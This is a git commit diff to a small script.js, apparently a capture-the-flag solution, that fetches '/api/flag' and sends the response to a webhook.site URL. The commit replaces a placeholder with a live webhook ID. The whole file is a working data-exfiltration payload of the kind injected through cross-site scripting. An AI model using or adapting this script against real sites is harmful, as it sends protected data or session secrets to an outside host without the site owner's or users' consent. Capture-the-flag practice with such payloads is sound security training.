4a2fb204b1b4d96c131853fd5d72c1af6c49015d
cyrillekyr <109862711+cyrillekyr@users.noreply.github.com>
2025-05-04 16:28:09 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,3 @@
 fetch('/api/flag')
   .then(res => res.text())
-  .then(flag => fetch('https://webhook.site/XXX?flag=' + encodeURIComponent(flag)));
+  .then(flag => fetch('https://webhook.site/d7728677-d8a7-4410-bc60-0f6320a74a1e?flag=' + encodeURIComponent(flag)));
